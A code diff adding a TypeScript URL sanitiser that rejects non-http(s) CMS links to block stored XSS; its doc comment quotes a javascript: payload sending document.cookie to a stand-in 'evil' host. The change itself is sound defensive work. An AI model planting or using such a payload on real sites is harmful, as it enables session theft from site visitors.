@@ -73,3 +73,36 @@ export function shortLink(articleId: number | string): string {
 export function archiveMonthSegment(year: number, month: number): string {
   return `${year}-${String(month).padStart(2, '0')}`
 }
+
+/**
+ * Accept a CMS-supplied value only if it is a real `http`/`https` URL.
+ *
+ * Returns `''` for anything else, so callers can filter it out rather than
+ * render a dead or dangerous link.
+ *
+ * ## ⚠️ This is a security control, not a formatting helper
+ *
+ * These values are CMS **text fields** that end up in an `href`. Astro escapes
+ * the attribute, which stops a tag breakout — but **escaping does not neutralise
+ * a scheme**. A stored `javascript:fetch('//evil/'+document.cookie)` would run on
+ * click, on our own origin. `docs/security.md` §6 names stored input as the
+ * primary XSS vector.
+ *
+ * It lives here rather than beside any one caller because three surfaces need it
+ * — the portal's social links, the fact-check sources, and the related-article
+ * links — and three copies of a security check is three chances to drift.
+ */
+export function safeExternalUrl(value: unknown): string {
+  if (typeof value !== 'string') return ''
+  const trimmed = value.trim()
+  if (!trimmed) return ''
+
+  try {
+    const parsed = new URL(trimmed)
+    return parsed.protocol === 'https:' || parsed.protocol === 'http:' ? trimmed : ''
+  } catch {
+    // Not an absolute URL — a bare handle like `shikkha24` is a common thing for
+    // an editor to type, and it must not become an href.
+    return ''
+  }
+}
